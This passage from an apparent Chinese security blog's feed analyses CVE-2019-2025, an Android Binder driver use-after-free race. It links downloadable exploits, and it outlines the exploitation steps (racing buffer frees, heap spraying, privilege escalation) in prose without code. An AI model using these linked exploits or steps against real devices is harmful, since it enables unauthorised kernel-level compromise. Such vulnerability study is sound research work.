rel="noopener">https://www.exploit-db.com/exploits/46503</a></p><p>exp下载地址：<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46503.zip" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46503.zip</a></p><p>注意：下载时不能挂代理，否则不能下载</p><p>根据描述，执行./complie.sh进行编译，结果又报错了。。。</p><p><img src="exp.PNG" alt=""></p><p>打开compile.sh，发现里面是一句：<code>gcc -o poc poc.c binder.c</code> 。上图中报的错都是binder.c中的一些变量或结构体找不到。找来源码中的binder.c和binder.h与这里的对比，发现只有一部分相同，emmm小小的脑袋，大大的疑惑。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上篇文章沿着看雪论坛大神分享的思路（&lt;a href=&quot;https://bbs.pediy.co
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>cve-2019-2025-copy</title>
    <link href="http://yoursite.com/2020/03/26/cve-2019-2025-copy/"/>
    <id>http://yoursite.com/2020/03/26/cve-2019-2025-copy/</id>
    <published>2020-03-26T06:15:40.000Z</published>
    <updated>2020-03-26T07:32:18.785Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是位于Binder Driver内核空间与用户空间的client和server通信时，不同线程同步竞争调用binder_ioctl()造成的use_after_free漏洞。  </p><h2 id="一、漏洞原因"><a href="#一、漏洞原因" class="headerlink" title="一、漏洞原因"></a>一、漏洞原因</h2><h3 id="1-Binder简介"><a href="#1-Binder简介" class="headerlink" title="1.Binder简介"></a>1.Binder简介</h3><p>Binder机制是Android采用的进程间通信机制，采用了C/S架构。Client进程通过RPC与Server通信，可以简单地划分为三层，驱动层、IPC层、业务层。demo()方法是Client和Server共同协商好的统一方法；handle、RPC数据、代码、协议这4项组成了IPC层的数据，通过IPC层进行数据传输；而真正在Client和Server两端建立通信的基础设施便是Binder Driver。  </p><p>Binder driver没有直接操作硬件，只是对设备内存进行处理。主要是驱动设备的初始化（binder_init），打开（binder_open），映射（binder_mmap）,数据操作（binder_ioctl）。  </p><p>例如，当用户空间调用ioctl()方法时，通过系统调用__open()方法，最终调用binder驱动的binder_ioctl()方法。</p><p>Binder通信模型如下：  </p><p><img src="Binder1.PNG" alt=""></p><p>Binder协议包含在IPC数据中，分为两类：</p><ol><li><p>BINDER_COMMAND_PROTOCOL: Binder请求码，以“BC_”开头，用于从IPC层传递到binder driver层；</p></li><li><p>BINDER_RETURN_PROTOCOL: binder响应码，以“BR_ ”开头，用于从binder driver层传递到IPC层；</p></li></ol><p>Binder IPC通信至少是两个进程的交互：</p><ol><li>client进程执行binder_thread_write，根据BC_XXX命令，生成相应的binder_work;</li><li>server进程执行binder_thread_read, 根据binder_work.type，生成BR_XXX，发送到用户空间处理；</li></ol><h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h3><p>Server进程收到Client请求时，会进入内核，调用“binder_alloc_new_buf()”从Client进程对应的“alloc-&gt;free_buffers.rb_node”中申请一个“struct binder_buffer”对象，被申请的对象会从“alloc-&gt;free_buffers.rb_node”中移除，并链入“alloc-&gt;allocated_buffer.rb_node”。然后，为了避免“t-&gt;buffer”在使用时被释放，将“t-&gt;buffer-&gt;allow_user_free”赋值为0。  </p><p><img src="shuidi1.png" alt=""></p><p>Client进程收到Server进程发来的消息后，就会结束本次交互，释放“t-&gt;buffer”，销毁Parcel对象。攻击者可以构造满足内核校验的参数，主动向内核发送“BC_FREE_BUFFER”请求，以提前释放该“t-&gt;buffer”对象。  </p><p><img src="shuidi2.png" alt=""></p><p>从上图可知，buffer-&gt;allow_user_free是0时，Client无法释放“buffer”对象，否则将调用“binder_alloc_free_buf()”释放“buffer”。</p><p>如果Client进程能在Server进程将““t-&gt;buffer-&gt;allow_user_free”赋值为0之前就触发到“binder_alloc_free_buf()-&gt;binder_free_buf_locked()-&gt;rb_erase()”,就有可能将其从“alloc-&gt;buffers”中移除，之后再选择合适时机触发kfree()将其释放。此时当Server进程继续使用“t-&gt;buffer”时就触发了use_sfter_free问题。</p><p><img src="shuidi3.png" alt=""></p><p>这个漏洞的产生是由于2016年11月的一个补丁，将原先效率较低的保护“binder_ioctl()”的全局互斥锁优化为更加细粒度的互斥锁。  </p><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p><a href="https://github.com/jltxgcy/CVE_2019_2025_EXP" target="_blank" rel="noopener">EXP地址： https://github.com/jltxgcy/CVE_2019_2025_EXP</a></p><p>1、提前分配binder_buffer，以供后面释放；</p><p>2、构造出：Client执行BC_FREE_BUFFER，Server进程执行BC_REPLY(binder_alloc_new_buffer)，并启动两个线程，设置竞争；</p><p>3、堆喷，实现任意地址写，向内存中写入提权脚本并执行。</p><p>由于构造Client执行BC_FREE_BUFFER和Server进程执行BC_REPLY时使用了很多framework层的接口，因此EXP需要在android源码环境下编译。</p><p>编译运行结果待续。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个漏洞是位于Binder Driver内核空间与用户空间的client和server通信时，不同线程同步竞争调用binder_ioctl()造成的use_after_free漏洞。  &lt;/p&gt;
&lt;h2 id=&quot;一、漏洞原因&quot;&gt;&lt;a href=&quot;#一、漏洞原因&quot; class
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
